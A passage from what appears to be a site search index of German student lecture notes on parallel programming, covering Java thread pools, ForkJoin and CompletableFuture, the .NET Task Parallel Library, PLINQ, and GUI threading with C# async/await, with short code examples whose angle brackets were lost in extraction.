abbricht, wirft die \nget()\n Methode eine \nExcecutionException\n mit urspr\u00fcnglicher Exception als \nCause\n\n\nMit \nfuture.cancel()\n wird Task aus Warteschlange entfernt, und falls \ntrue\n als argument mitgegeben wird, auch ein laufender Tasks unterbrochen (\nInterruptedException\n, wird nicht einfach gekillt!)\n\n\nWenn \nFuture\n-Objekt beim submit ignoriert wird (Fire and Forget), werden unbehandelte Exceptions ignoriert!\n\n\n\n\nRekursive Tasks\n\n\n\n\nTasks ineinander verschachteln\n\n\nTasks muss explizit implementiert werden und von \nRecursiveTasks\nT\n ableiten\n\n\nStatt \nsubmit\n auf Tasks \nfork()\n aufrufen\n\n\nStatt \nget()\n auf Tasks \njoin()\n aufrufen\n\n\n\n\nclass\n \nCountTask\n \nextends\n \nRecursiveTask\nInteger\n \n{\n\n    \nprivate\n \nfinal\n \nint\n \nlower\n,\n \nupper\n;\n\n\n    \npublic\n \nCountTask\n(\nint\n \nlower\n,\n \nint\n \nupper\n)\n \n{\n\n        \nthis\n.\nlower\n \n=\n \nlower\n;\n \nthis\n.\nupper\n \n=\n \nupper\n;\n\n    \n}\n\n\n    \nprotected\n \nInteger\n \ncompute\n()\n \n{\n\n        \nif\n \n(\nupper\n \n-\n \nlower\n \n \nTHRESHOLD\n)\n \n{\n\n            \n// parallel count\n\n            \nint\n \nmiddle\n \n=\n \n(\nlower\n \n+\n \nupper\n)\n \n/\n \n2\n;\n\n            \nCountTask\n \nleft\n \n=\n \nnew\n \nCountTask\n(\nlower\n,\n \nmiddle\n);\n\n            \nCountTask\n \nright\n \n=\n \nnew\n \nCountTask\n(\nmiddle\n,\n \nupper\n);\n\n            \nleft\n.\nfork\n();\n \nright\n.\nfork\n();\n\n            \nreturn\n \nright\n.\njoin\n()\n \n+\n \nleft\n.\njoin\n();\n\n        \n}\n \nelse\n \n{\n\n            \n// sequential count\n\n            \nint\n \ncount\n \n=\n \n0\n;\n\n            \nfor\n \n(\nint\n \nnumber\n \n=\n \nlower\n;\n \nnumber\n \n \nupper\n;\n \nnumber\n++)\n \n{\n\n            \nif\n \n(\nisPrime\n(\nnumber\n))\n \n{\n \ncount\n++;\n \n}\n\n        \n}\n\n        \nreturn\n \ncount\n;\n\n        \n}\n\n    \n}\n\n\n}\n\n\n\n\n\n\n\n\nAufruf (Java 8): \nint result = threadPool.invoke(new CountTask())\n\n\nAchtung vor \u00dcber-Parallelisierung! Nicht zuviel aufsplitten, sonst ist der Overhead der Rekursion zu gross\n\n\n\n\nFork \n Join Pool\n\n\n\n\nFork()\n und dann \nJoin()\n ist schneller, wenn \nJoin()\n in umgekehrter Reihenfolge ausgef\u00fchrt wird\n\n\nGrund: Neue Sub-Tasks werden zuoberst in lokale Queue eingef\u00fcgt\n\n\n\n\n\n\nWorker-Threads laufen als Daemon-Threads\n\n\nd.h. das Programm darf nicht zu fr\u00fch enden, um nicht die Worker-Threads zu killen!\n\n\n\n\n\n\nAnzahl Threads werden dynamisch ver\u00e4ndert\n\n\nCommon Pool (sinleton) hat immer #Prozessoren - 1 Threads (also langsamer)\n\n\nModerne Thread-Pool-Implementationen haben mehrere Queues\n\n\nJeder Thread hat eigene Queue (Lokale Queue)\n\n\nWenn Loake Queue leer ist, wird von einer anderen lokalen Queue Tasks abgenommen (\"Work Stealing\")\n\n\n\n\n\n\n\n\nCompleteableFutures\n\n\n\n\nFeature von Java 8\n\n\nCaller-zentrisch (Pull): Caller wartet auf Ende und holt sich das Resultat \u00fcber das Future-Objekt\n\n\nCallee-zentrisch: Completion-Callback, das ausgef\u00fchrt wird, wenn der Task fertig ist\n\n\nCompletableFuture\n ist \nCallee-zentrisch\n\n\n\n\nCompletableFuture\nLong\n \nfuture\n \n=\n\n    \nCompletableFuture\n.\nsupplyAsync\n(()\n \n-\n \nlongOperation\n());\n\n\n//other work\n\n\nfuture\n.\nthenAccept\n(\nresult\n \n-\n \nSystem\n.\nout\n.\nprintln\n(\nresult\n));\n\n\n\n\n\n\n- Die Funktion in \nthenAccept()\n wird in belibebigem Worker-Thread \noder vom Aufrufer-Thread\n ausgef\u00fchrt", 
            "title": "6 Thread Pools"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#thread-pools", 
            "text": "Note  Quiz letzte Woche: Keine Garantie, dass Lock jemals erfolgreich ist -  Starvation.", 
            "title": "Thread Pools"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#konzept", 
            "text": "Tasks Queue  mit Tasks von potentiell parallele Arbeitspakete  Queue weiss nicht, wieviele Threads im Pool arbeiten, Tasks m\u00fcssen also beliebig parallelisierbar sein     Thread Pool  ist eine beschr\u00e4nkte Anzahl von Worker-Threads, die die Tasks aus der Queue holen und ausf\u00fchren    Vorteile   Beschr\u00e4nkte Anzahl Threads (konfigurierbar, normalerweise Anzahl logische CPU-Cores)  Threads werden recycled, weniger Overhead f\u00fcr Thread-Erzeugung und -Freigabe  H\u00f6here Abstraktion: Task-Beschreibung wird von Task-Ausf\u00fchrung getrennt (muss z.B. nicht zwinged nebenl\u00e4ufig sein)     Einschr\u00e4nkungen   Tasks d\u00fcrfen nicht auf andere warten, sie m\u00fcssen unabh\u00e4ngig voneinander sein  Sonst k\u00f6nnte es zu Deadlocks kommen, wenn alle Threads auf andere Tasks in der Queue warten    Tasks m\u00fcssen komplett fertig laufen, bevor der Worker Thread ein anderer Task beginnt ( Run to Completion )  Ausser bei geschachtelten Tasks (Sub-Tasks)  Grund: Thread f\u00fchrt einen Stack. Weitere Tasks w\u00fcrden den Stack f\u00fcllen und k\u00f6nnten nur wieder in umgekehrter Reihenfolge \"gepoppt\" werden. Bei geschachtelten Tasks weiss man, dass der \"obere\" Task auf dem Stack zuerst fertig laufen muss", 
            "title": "Konzept"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#funktionsweise", 
            "text": "", 
            "title": "Funktionsweise"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#task-lancierung", 
            "text": "ForkJoinPool   threadPool   =   new   ForkJoinPool ();    Bietet Task Queue und Threads (default: Anzahl Cores)   Future Integer   future   =   threadPool . submit (()   -   { \n     int   value   =   \u2026 ; \n     // long calculation \n     return   value ;  });    Task wird eingereiht in die Task-Queue  Generic Type von  Future T  ist Typ des R\u00fcckgabewert", 
            "title": "Task Lancierung"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#future-konzept", 
            "text": "Das  Future -Objekt wird ben\u00f6tigt, um asynchron Tasks zu submitten. Das Ergebnis wird erst sp\u00e4ter rein geschrieben  T result = future.get()  blockiert, bis Task beendet ist und ruft das Ergebnis ab (analog  join )  Wenn Tasks mit unbehandelter Exception abbricht, wirft die  get()  Methode eine  ExcecutionException  mit urspr\u00fcnglicher Exception als  Cause  Mit  future.cancel()  wird Task aus Warteschlange entfernt, und falls  true  als argument mitgegeben wird, auch ein laufender Tasks unterbrochen ( InterruptedException , wird nicht einfach gekillt!)  Wenn  Future -Objekt beim submit ignoriert wird (Fire and Forget), werden unbehandelte Exceptions ignoriert!", 
            "title": "Future Konzept"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#rekursive-tasks", 
            "text": "Tasks ineinander verschachteln  Tasks muss explizit implementiert werden und von  RecursiveTasks T  ableiten  Statt  submit  auf Tasks  fork()  aufrufen  Statt  get()  auf Tasks  join()  aufrufen   class   CountTask   extends   RecursiveTask Integer   { \n     private   final   int   lower ,   upper ; \n\n     public   CountTask ( int   lower ,   int   upper )   { \n         this . lower   =   lower ;   this . upper   =   upper ; \n     } \n\n     protected   Integer   compute ()   { \n         if   ( upper   -   lower     THRESHOLD )   { \n             // parallel count \n             int   middle   =   ( lower   +   upper )   /   2 ; \n             CountTask   left   =   new   CountTask ( lower ,   middle ); \n             CountTask   right   =   new   CountTask ( middle ,   upper ); \n             left . fork ();   right . fork (); \n             return   right . join ()   +   left . join (); \n         }   else   { \n             // sequential count \n             int   count   =   0 ; \n             for   ( int   number   =   lower ;   number     upper ;   number ++)   { \n             if   ( isPrime ( number ))   {   count ++;   } \n         } \n         return   count ; \n         } \n     }  }    Aufruf (Java 8):  int result = threadPool.invoke(new CountTask())  Achtung vor \u00dcber-Parallelisierung! Nicht zuviel aufsplitten, sonst ist der Overhead der Rekursion zu gross", 
            "title": "Rekursive Tasks"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#fork-join-pool", 
            "text": "Fork()  und dann  Join()  ist schneller, wenn  Join()  in umgekehrter Reihenfolge ausgef\u00fchrt wird  Grund: Neue Sub-Tasks werden zuoberst in lokale Queue eingef\u00fcgt    Worker-Threads laufen als Daemon-Threads  d.h. das Programm darf nicht zu fr\u00fch enden, um nicht die Worker-Threads zu killen!    Anzahl Threads werden dynamisch ver\u00e4ndert  Common Pool (sinleton) hat immer #Prozessoren - 1 Threads (also langsamer)  Moderne Thread-Pool-Implementationen haben mehrere Queues  Jeder Thread hat eigene Queue (Lokale Queue)  Wenn Loake Queue leer ist, wird von einer anderen lokalen Queue Tasks abgenommen (\"Work Stealing\")", 
            "title": "Fork &amp; Join Pool"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#completeablefutures", 
            "text": "Feature von Java 8  Caller-zentrisch (Pull): Caller wartet auf Ende und holt sich das Resultat \u00fcber das Future-Objekt  Callee-zentrisch: Completion-Callback, das ausgef\u00fchrt wird, wenn der Task fertig ist  CompletableFuture  ist  Callee-zentrisch   CompletableFuture Long   future   = \n     CompletableFuture . supplyAsync (()   -   longOperation ());  //other work  future . thenAccept ( result   -   System . out . println ( result ));", 
            "title": "CompleteableFutures"
        }, 
        {
            "location": "/ParProg/6_Thread_Pools/#-die-funktion-in-thenaccept-wird-in-belibebigem-worker-thread-oder-vom-aufrufer-thread-ausgefuhrt", 
            "text": "", 
            "title": "- Die Funktion in thenAccept() wird in belibebigem Worker-Thread oder vom Aufrufer-Thread ausgef\u00fchrt"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/", 
            "text": "Task Parallel Library\n\n\n\n\nTask Parallel Library ist ein moderner Thread-Pool in .NET\n\n\n\n\nThreading in .NET\n\n\n\n\nThread nimmt delegate entgegen\n\n\n\n\nThread\n \nmyThread\n \n=\n \nnew\n \nThread\n(()\n \n=\n \n{\n\n    \nfor\n \n(\nint\n \ni\n \n=\n \n0\n;\n \ni\n \n \n100\n;\n \ni\n++)\n \n{\n\n        \nConsole\n.\nWriteLine\n(\nMyThread step {0}\n,\n \ni\n);\n\n    \n}\n\n    \n});\n\n\nmyThread\n.\nStart\n();\n\n\n// ...\n\n\nmyThread\n.\nJoin\n();\n\n\n\n\n\n\n\n\nUnbehandelte Exceptions in einem Thread f\u00fchren zum Abbruch des Programms!\n\n\n\n\nMonitor\n\n\n\n\nObject als Hilfsobjekt\n\n\n\n\nclass\n \nBankAccount\n \n{\n\n    \nprivate\n \ndecimal\n \nbalance\n;\n\n    \nprivate\n \nobject\n \nsyncObject\n \n=\n \nnew\n \nobject\n();\n\n\n    \npublic\n \nvoid\n \nWithdraw\n(\ndecimal\n \namount\n)\n \n{\n\n        \nlock\n(\nsyncObject\n)\n \n{\n\n            \nwhile\n \n(\namount\n \n \nbalance\n)\n \n{\n\n                \nMonitor\n.\nWait\n(\nsyncObject\n);\n\n            \n}\n\n            \nbalance\n \n-=\n \namount\n;\n\n        \n}\n\n    \n}\n\n    \npublic\n \nvoid\n \nDeposit\n(\ndecimal\n \namount\n)\n \n{\n\n        \nlock\n(\nsyncObject\n)\n \n{\n\n            \nbalance\n \n+=\n \namount\n;\n\n            \nMonitor\n.\nPulseAll\n(\nsyncObject\n);\n \n// wie notifyAll()\n\n        \n}\n\n    \n}\n\n\n}\n\n\n\n\n\n\n\n\nMonitor hat im Gegensatz zu Java Fairness (FIFO Queue)\n\n\n\n\nTask Parallel Library\n\n\n\n\nWork stealing thread pool (singleton)\n\n\nVerschiedene Abstraktionsstufen\n\n\nTask Parallelization: Explizite Tasks starten\n\n\nData Parallelization: Parallele Statements und Queris\n\n\nAsynchrone Programmierung mit Continuation style\n\n\n\n\n\n\n\n\nTask Parallelisierung\n\n\nTask\n \ntask\n \n=\n \nTask\n.\nRun\n(()\n \n=\n \n{\n\n    \n// task implementation\n\n\n});\n\n\n// perform other activity\n\n\ntask\n.\nWait\n();\n \n// Blockiert, bis Task beendet wird\n\n\n\n\n\n\n\n\nTasks k\u00f6nnen weitere Tasks starten\n\n\n\n\nTask\n.\nRun\n(()\n \n=\n \n{\n\n    \nTask\nint\n \nleft\n \n=\n \nTask\n.\nRun\n(()\n \n=\n \nCount\n(\nleftPart\n));\n\n    \nTask\nint\n \nright\n \n=\n \nTask\n.\nRun\n(()\n \n=\n \nCount\n(\nrightPart\n));\n\n    \nint\n \nresult\n \n=\n \nleft\n.\nResult\n \n+\n \nright\n.\nResult\n;\n\n\n});\n\n\n\n\n\n\n\n\nAnzahl Worker-Threads wird variiert\n\n\nEs wird \"ausprobiert\" und der Durchsatz gemessen\n\n\nWenn der Durchsatz besser wird, werden die Anzahl Threads erh\u00f6ht\n\n\nBei einem Deadlock kann der Pools immer weiter wachsen\n\n\n\n\n\n\n\n\nDatenparallelit\u00e4t\n\n\n\n\nUnabh\u00e4ngige Statements und Loops k\u00f6nnen parallel ausgef\u00fchrt werden\n\n\n\n\nParallel\n.\nInvoke\n(\n\n    \n()\n \n=\n \nMergeSort\n(\nl\n,\n \nm\n),\n\n    \n()\n \n=\n \nMergeSort\n(\nm\n,\n \nr\n)\n\n\n);\n\n\n\nParallel\n.\nForEach\n(\nlist\n,\n\n    \nfile\n \n=\n \nConvert\n(\nfile\n)\n\n\n);\n\n\n\n\n\n\n\n\nblockiert, bis alle Tasks fertig sind\n\n\nTPL gruppiert die \"Bodies\" automatisch in Tasks, es wird nicht zwingend f\u00fcr jede Iteration einen eigenen Task erstellt\n\n\nPartitionierung kann fix angegeben werden\n\n\n\n\nParallel\n.\nForEach\n(\nPartitioner\n.\nCreate\n(\n0\n,\n \narray\n.\nLength\n),\n\n    \n(\nrange\n,\n \n_\n)\n \n=\n \n{\n\n        \nfor\n \n(\nint\n \ni\n \n=\n \nrange\n.\nItem1\n;\n \ni\n \n \nrange\n.\nItem2\n;\n \ni\n++)\n \n{\n\n            \nDoCalculation\n(\narray\n[\ni\n]);\n\n    \n}\n\n\n});\n\n\n\n\n\n\nParallel LINQ\n\n\n\n\nParallele Verarbeitung von Collection Operationen\n\n\nOft k\u00f6nnen Conditions parallel gepr\u00fcft werden\n\n\n\n\nParallelQuery\nBook\n \nquery\n \n=\n\n    \nfrom\n \nbook\n \nin\n \nbookCollection\n.\nAsParallel\n()\n\n    \nwhere\n \nbook\n.\nTitle\n.\nContains\n(\nConcurrency\n)\n\n    \nselect\n \nbook\n;\n\n\nquery\n.\nForAll\n(\nb\n \n=\n \n{\n\n    \nif\n \n(\nInteresting\n \n(\nb\n))\n \n{\n\n        \nRead\n(\nb\n);\n\n    \n}\n\n\n});\n\n\n\n\n\n\n\n\nResultat hat beliebige Reihenfolge, \nForAll\n wird auch in beliebiger Reihenfolge ausgef\u00fchrt\n\n\nF\u00fcr richtige Reihenfolge noch \nAsOrdered()\n anh\u00e4ngen (Performance-Einbussen)\n\n\nGeht in Java auch mit \nparallelStream()\n, dort ist der output aber standardm\u00e4ssig geordnet\n\n\nAchtung vor Seiteneffekten in Query!\n\n\n\n\nAsynchrone Programmierung\n\n\n\n\nTasks starten und auf Resultat warten\n\n\n\n\nvar\n \ntask\n \n=\n \nTask\n.\nRun\n(\n\n    \nLongOperation\n\n\n);\n\n\n// perform other work\n\n\nint\n \nresult\n \n=\n \ntask\n.\nResult\n;\n\n\n\n\n\n\n\n\nTask Continuations wie bei Java\n\n\ntask1.ContinueWith(task2).ContinueWith(task3)\n\n\n\n\n\n\nMulti-Continuation\n\n\nTask.WhenAll(task1, task2).ContinueWith(task3)\n\n\n\n\n\n\n\n\nAsynchronit\u00e4t in C\n\n\n\n\nSprachkonstrukt in C# f\u00fcr asynchrone Ausf\u00fchrung\n\n\nThema n\u00e4chste Woche", 
            "title": "7 Task Parallel Library"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#task-parallel-library", 
            "text": "Task Parallel Library ist ein moderner Thread-Pool in .NET", 
            "title": "Task Parallel Library"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#threading-in-net", 
            "text": "Thread nimmt delegate entgegen   Thread   myThread   =   new   Thread (()   =   { \n     for   ( int   i   =   0 ;   i     100 ;   i ++)   { \n         Console . WriteLine ( MyThread step {0} ,   i ); \n     } \n     });  myThread . Start ();  // ...  myThread . Join ();    Unbehandelte Exceptions in einem Thread f\u00fchren zum Abbruch des Programms!", 
            "title": "Threading in .NET"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#monitor", 
            "text": "Object als Hilfsobjekt   class   BankAccount   { \n     private   decimal   balance ; \n     private   object   syncObject   =   new   object (); \n\n     public   void   Withdraw ( decimal   amount )   { \n         lock ( syncObject )   { \n             while   ( amount     balance )   { \n                 Monitor . Wait ( syncObject ); \n             } \n             balance   -=   amount ; \n         } \n     } \n     public   void   Deposit ( decimal   amount )   { \n         lock ( syncObject )   { \n             balance   +=   amount ; \n             Monitor . PulseAll ( syncObject );   // wie notifyAll() \n         } \n     }  }    Monitor hat im Gegensatz zu Java Fairness (FIFO Queue)", 
            "title": "Monitor"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#task-parallel-library_1", 
            "text": "Work stealing thread pool (singleton)  Verschiedene Abstraktionsstufen  Task Parallelization: Explizite Tasks starten  Data Parallelization: Parallele Statements und Queris  Asynchrone Programmierung mit Continuation style", 
            "title": "Task Parallel Library"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#task-parallelisierung", 
            "text": "Task   task   =   Task . Run (()   =   { \n     // task implementation  });  // perform other activity  task . Wait ();   // Blockiert, bis Task beendet wird    Tasks k\u00f6nnen weitere Tasks starten   Task . Run (()   =   { \n     Task int   left   =   Task . Run (()   =   Count ( leftPart )); \n     Task int   right   =   Task . Run (()   =   Count ( rightPart )); \n     int   result   =   left . Result   +   right . Result ;  });    Anzahl Worker-Threads wird variiert  Es wird \"ausprobiert\" und der Durchsatz gemessen  Wenn der Durchsatz besser wird, werden die Anzahl Threads erh\u00f6ht  Bei einem Deadlock kann der Pools immer weiter wachsen", 
            "title": "Task Parallelisierung"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#datenparallelitat", 
            "text": "Unabh\u00e4ngige Statements und Loops k\u00f6nnen parallel ausgef\u00fchrt werden   Parallel . Invoke ( \n     ()   =   MergeSort ( l ,   m ), \n     ()   =   MergeSort ( m ,   r )  );  Parallel . ForEach ( list , \n     file   =   Convert ( file )  );    blockiert, bis alle Tasks fertig sind  TPL gruppiert die \"Bodies\" automatisch in Tasks, es wird nicht zwingend f\u00fcr jede Iteration einen eigenen Task erstellt  Partitionierung kann fix angegeben werden   Parallel . ForEach ( Partitioner . Create ( 0 ,   array . Length ), \n     ( range ,   _ )   =   { \n         for   ( int   i   =   range . Item1 ;   i     range . Item2 ;   i ++)   { \n             DoCalculation ( array [ i ]); \n     }  });", 
            "title": "Datenparallelit\u00e4t"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#parallel-linq", 
            "text": "Parallele Verarbeitung von Collection Operationen  Oft k\u00f6nnen Conditions parallel gepr\u00fcft werden   ParallelQuery Book   query   = \n     from   book   in   bookCollection . AsParallel () \n     where   book . Title . Contains ( Concurrency ) \n     select   book ;  query . ForAll ( b   =   { \n     if   ( Interesting   ( b ))   { \n         Read ( b ); \n     }  });    Resultat hat beliebige Reihenfolge,  ForAll  wird auch in beliebiger Reihenfolge ausgef\u00fchrt  F\u00fcr richtige Reihenfolge noch  AsOrdered()  anh\u00e4ngen (Performance-Einbussen)  Geht in Java auch mit  parallelStream() , dort ist der output aber standardm\u00e4ssig geordnet  Achtung vor Seiteneffekten in Query!", 
            "title": "Parallel LINQ"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#asynchrone-programmierung", 
            "text": "Tasks starten und auf Resultat warten   var   task   =   Task . Run ( \n     LongOperation  );  // perform other work  int   result   =   task . Result ;    Task Continuations wie bei Java  task1.ContinueWith(task2).ContinueWith(task3)    Multi-Continuation  Task.WhenAll(task1, task2).ContinueWith(task3)", 
            "title": "Asynchrone Programmierung"
        }, 
        {
            "location": "/ParProg/7_Task_Parallel_Library/#asynchronitat-in-c", 
            "text": "Sprachkonstrukt in C# f\u00fcr asynchrone Ausf\u00fchrung  Thema n\u00e4chste Woche", 
            "title": "Asynchronit\u00e4t in C"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/", 
            "text": "GUI and Threading\n\n\nQuiz letzte Woche\n\n\nTask\n.\nRun\n(()\n \n=\n \nDownloadFile\n(\nurl\n)).\nContinueWith\n(\ntask2\n);\n\n\n\n\n\n\n\n\nbeachten: main Thread darf nicht aufh\u00f6ren, bevor die Tasks beendet werden, da sie in Daemon Threads ausgef\u00fchrt werden\n\n\n\n\nSingle-Thread-Modell\n\n\n\n\nNur ein Thread darf auf GUI zugreifen (UI-Thread)\n\n\nUI-Thread arbeit Ereignisse aus einer Event-Queue nacheinander ab\n\n\nAnalog: Thread Pool mit 1 Worker Thread\n\n\nGr\u00fcnde\n\n\nSynchronisationskosten\n\n\nDeadlock-Risiko wegen zyklischen Pattern (Observer, MVC)\n\n\n\n\n\n\nEinschr\u00e4nkungen\n\n\nUI-Events m\u00fcssen schnell berechenbar sein, damit das UI nicht blockiert\n\n\nKein Zugriff auf UI durch fremde Threads\n\n\n\n\n\n\n\n\n\n\nWarning\n\n\nAlte GUI-Frameworks wie AWT und Swing werfen keine Exceptions, wenn ein anderer als der UI-Thread auf das UI zugreift, es kann dann Race Conditions geben\n\n\n\n\nUI Dispatching\n\n\n\n\nIn Swing mit \ninvokeLater(Runnable doRun)\n ein Runnable in die Event-Queue eingef\u00fcgt\n\n\n\n\nbutton\n.\naddActionListener\n(\nevent\n \n-\n \n{\n\n    \nnew\n \nThread\n(()\n \n-\n \n{\n\n        \nString\n \ntext\n \n=\n \nreadHugeFile\n();\n\n        \nSwingUtilities\n.\ninvokeLater\n(()\n \n-\n \n{\n\n            \ntextArea\n.\nsetText\n(\ntext\n);\n\n        \n});\n\n    \n}).\nstart\n();\n\n\n});\n\n\n\n\n\n\n\n\nBesser Thread Pool statt \nThread.start()\n benutzen\n\n\n\n\n.NET UI-Thread MOdell\n\n\n\n\nGleich wie in Java Single-UI-Thread\n\n\nDer Thread, der das Window startet, wird zum UI-Thread\n\n\n\n\nTask\n.\nFactory\n.\nStartNew\n(()\n \n=\n \n{\n\n    \nint\n \nresult\n \n=\n \nLongCalculation\n(\nnumber\n);\n\n    \nDispatcher\n.\nBeginInvoke\n(\nnew\n \nThreadStart\n(()\n \n=\n \n{\n\n        \nresultLabel\n.\nContent\n \n=\n \nresult\n;\n\n    \n}));\n\n\n});\n\n\n\n\n\n\n\n\nVerkettung ist schlecht lesbar\n\n\n\n\nC# async / await\n\n\n\n\nL\u00f6st die Zerst\u00fcckelung der Logik bei der klassischen GUI-Programmierung\n\n\nMethode mit Keyword \nasync\n\n\nR\u00fcckgabetyp ist \nvoid\n (fire \n forget) oder \nTask\nT\n, wobei \nT\n der Typ des R\u00fcckgabewerts ist (optional)\n\n\nR\u00fcckgabe direkt mit \nreturn T\n, nicht \nreturn Task\nT\n\n\n\n\n\n\nName endet auf \nAsync\n per Konvention\n\n\nNach Aufruf der Methode kann auf dem zur\u00fcckgegebenen Task \nawait\n aufgerufen werden, um auf das Ergebnis zu warten (und R\u00fcckgabewert auslesen)\n\n\n\n\npublic\n \nasync\n \nTask\nint\n \nLongOperationAsync\n()\n \n{\n \n}\n\n\n\nTask\nint\n \ntask\n \n=\n \nLongOperationAsync\n();\n\n\nOtherWork\n();\n\n\nint\n \nresult\n \n=\n \nawait\n \ntask\n;\n\n\n\n\n\n\n\n\nDer Aufrufer ist nicht \nzwingend\n w\u00e4hrend des Aufrufs blockiert\n\n\n\n\nSpezielle Regeln\n\n\n\n\nasync\n-Methode muss \nawait\n beinhalten, sonst Compiler-Warning\n\n\nawait\n muss in \nasync\n-Methode sein, sonst Compiler-Fehler\n\n\nDies verursacht schnell eine Kette, weil nun alles async sein muss\n\n\nKann z.B. durch \nTask.wait()\n unterbrochen werden\n\n\n\n\n\n\nGrund liegt im Ausf\u00fchrungsmodell\n\n\n\n\nAusf\u00fchrungsmodell\n\n\n\n\nEine \nasync\n-Methode l\u00e4uft teilweise asynchron, teilweise synchron\n\n\nAufrufer f\u00fchrt die Methode erst asynchron aus, sobald ein \nawait\n kommt, vorher synchron\n\n\nDer asynchrone Teil wird normalerweise durch den Thread des erwarteten Tasks ausgef\u00fchrt (als \"continuation\")\n\n\nAusser\n bei UI-Threads: Dort wird der Asynchrone Teil nach dem \nawait\n wider vom Aufrufer (= UI-Thread) ausgef\u00fchrt\n\n\nSomit hat dies die gleiche Auswirkung wie ohne dem async / await Konzept, die Aufteilung wird einfach vom Compiler gemacht\n\n\n\n\n\n\n\n\nUI-Programmierung\n\n\nasync\n \nvoid\n \nstartDownload_Click\n(\n\u2026\n)\n \n{\n\n    \nHttpClient\n \nclient\n \n=\n \nnew\n \nHttpClient\n();\n\n    \nforeach\n \n(\nvar\n \nurl\n \nin\n \ncollection\n)\n \n{\n\n        \nvar\n \ndata\n \n=\n \nawait\n \nclient\n.\nGetStringAsync\n(\nurl\n);\n\n        \ntextArea\n.\nContent\n \n+=\n \ndata\n;\n\n    \n}\n\n\n}\n\n\n\n\n\n\n\n\nDie Methode springt zur\u00fcck beim \nawait\n, das Resultat wird dann wieder im GUI-Thread gesetzt\n\n\n\n\nPitfalls\n\n\n\n\nEine \nasync\n-Methode sind nicht per-se asynchron. Ist kein \nawait\n drin ist, wird sie komplett synchron ausgef\u00fchrt\n\n\nWorkaround: \nreturn await Task.Run()\n\n\n\n\n\n\nThreadwechsel w\u00e4hrend Methodenausf\u00fchrung\n\n\nTeil nach \nawait\n muss nicht mehr im gleichen Thread ausgef\u00fchrt werden\n\n\n\n\n\n\nEmpfehlung: Nur im UI-Layer benutzen", 
            "title": "8 GUI Threading"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#gui-and-threading", 
            "text": "", 
            "title": "GUI and Threading"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#quiz-letzte-woche", 
            "text": "Task . Run (()   =   DownloadFile ( url )). ContinueWith ( task2 );    beachten: main Thread darf nicht aufh\u00f6ren, bevor die Tasks beendet werden, da sie in Daemon Threads ausgef\u00fchrt werden", 
            "title": "Quiz letzte Woche"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#single-thread-modell", 
            "text": "Nur ein Thread darf auf GUI zugreifen (UI-Thread)  UI-Thread arbeit Ereignisse aus einer Event-Queue nacheinander ab  Analog: Thread Pool mit 1 Worker Thread  Gr\u00fcnde  Synchronisationskosten  Deadlock-Risiko wegen zyklischen Pattern (Observer, MVC)    Einschr\u00e4nkungen  UI-Events m\u00fcssen schnell berechenbar sein, damit das UI nicht blockiert  Kein Zugriff auf UI durch fremde Threads      Warning  Alte GUI-Frameworks wie AWT und Swing werfen keine Exceptions, wenn ein anderer als der UI-Thread auf das UI zugreift, es kann dann Race Conditions geben", 
            "title": "Single-Thread-Modell"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#ui-dispatching", 
            "text": "In Swing mit  invokeLater(Runnable doRun)  ein Runnable in die Event-Queue eingef\u00fcgt   button . addActionListener ( event   -   { \n     new   Thread (()   -   { \n         String   text   =   readHugeFile (); \n         SwingUtilities . invokeLater (()   -   { \n             textArea . setText ( text ); \n         }); \n     }). start ();  });    Besser Thread Pool statt  Thread.start()  benutzen", 
            "title": "UI Dispatching"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#net-ui-thread-modell", 
            "text": "Gleich wie in Java Single-UI-Thread  Der Thread, der das Window startet, wird zum UI-Thread   Task . Factory . StartNew (()   =   { \n     int   result   =   LongCalculation ( number ); \n     Dispatcher . BeginInvoke ( new   ThreadStart (()   =   { \n         resultLabel . Content   =   result ; \n     }));  });    Verkettung ist schlecht lesbar", 
            "title": ".NET UI-Thread MOdell"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#c-async-await", 
            "text": "L\u00f6st die Zerst\u00fcckelung der Logik bei der klassischen GUI-Programmierung  Methode mit Keyword  async  R\u00fcckgabetyp ist  void  (fire   forget) oder  Task T , wobei  T  der Typ des R\u00fcckgabewerts ist (optional)  R\u00fcckgabe direkt mit  return T , nicht  return Task T    Name endet auf  Async  per Konvention  Nach Aufruf der Methode kann auf dem zur\u00fcckgegebenen Task  await  aufgerufen werden, um auf das Ergebnis zu warten (und R\u00fcckgabewert auslesen)   public   async   Task int   LongOperationAsync ()   {   }  Task int   task   =   LongOperationAsync ();  OtherWork ();  int   result   =   await   task ;    Der Aufrufer ist nicht  zwingend  w\u00e4hrend des Aufrufs blockiert", 
            "title": "C# async / await"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#spezielle-regeln", 
            "text": "async -Methode muss  await  beinhalten, sonst Compiler-Warning  await  muss in  async -Methode sein, sonst Compiler-Fehler  Dies verursacht schnell eine Kette, weil nun alles async sein muss  Kann z.B. durch  Task.wait()  unterbrochen werden    Grund liegt im Ausf\u00fchrungsmodell", 
            "title": "Spezielle Regeln"
        }, 
        {
            "location": "/ParProg/8_GUI_Threading/#ausfuhrungsmodell", 
